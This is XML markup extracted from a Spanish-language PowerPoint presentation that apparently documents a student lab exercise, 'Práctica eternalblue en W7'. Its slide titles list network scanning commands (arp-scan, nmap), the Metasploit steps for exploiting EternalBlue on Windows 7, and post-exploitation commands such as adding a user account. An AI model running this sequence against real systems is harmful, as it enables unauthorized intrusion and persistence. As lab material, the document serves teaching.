          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p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90500" y="2733494"/>
            <a:ext cx="5341620" cy="3232966"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="3600" dirty="0"/>
              <a:t>Evidencia del </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="3600" dirty="0" err="1"/>
              <a:t>achivo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="3600" dirty="0"/>
              <a:t> que creamos en el escritorio.</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO" sz="3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B98058-133B-591E-11E1-08C4372F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25" y="1997302"/>
            <a:ext cx="627697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97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487</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Panorámica</PresentationFormat>
  <Paragraphs>50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Práctica eternalblue en W7</vt:lpstr>
      <vt:lpstr>Comando ifconfig</vt:lpstr>
      <vt:lpstr>Comando sudo arp-scan -I [interfaz de red] --localnet  </vt:lpstr>
      <vt:lpstr>Comando sudo nmap -sn [ip]/[prefijo de red]</vt:lpstr>
      <vt:lpstr>Comando ping –c [numero de paquetes que se quieren enviar] [ip] </vt:lpstr>
      <vt:lpstr>Comando sudo nmap -p- -sCV -vvv -min-rate 5000  [ip a vulnerar] </vt:lpstr>
      <vt:lpstr> </vt:lpstr>
      <vt:lpstr>Comando sudo nmap --script "vuln and safe" -p [puertos a vulnerar separados por comas] [ip] </vt:lpstr>
      <vt:lpstr>Comando msfconsole -q</vt:lpstr>
      <vt:lpstr>Comando search eternalblue</vt:lpstr>
      <vt:lpstr>Comando use 0</vt:lpstr>
      <vt:lpstr>Comando show options</vt:lpstr>
      <vt:lpstr>Comando set RHOST [ip victima]</vt:lpstr>
      <vt:lpstr>Comando show options</vt:lpstr>
      <vt:lpstr>Comando check</vt:lpstr>
      <vt:lpstr>Comando exploit</vt:lpstr>
      <vt:lpstr>Comando shell</vt:lpstr>
      <vt:lpstr>Comando net user [nombre de usuario] [contraseña] /add</vt:lpstr>
      <vt:lpstr>Comando net user</vt:lpstr>
      <vt:lpstr>Comandos cd..   Y   dir</vt:lpstr>
      <vt:lpstr>Comando type nul &gt; [nombre].txt</vt:lpstr>
      <vt:lpstr>Comando exit   y   screenshot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Luis Reyes Volquez</cp:lastModifiedBy>
  <cp:revision>19</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-01-19T16:27:51Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-01-31T23:40:19Z</dcterms:modified>
</cp:coreProperties>
</file>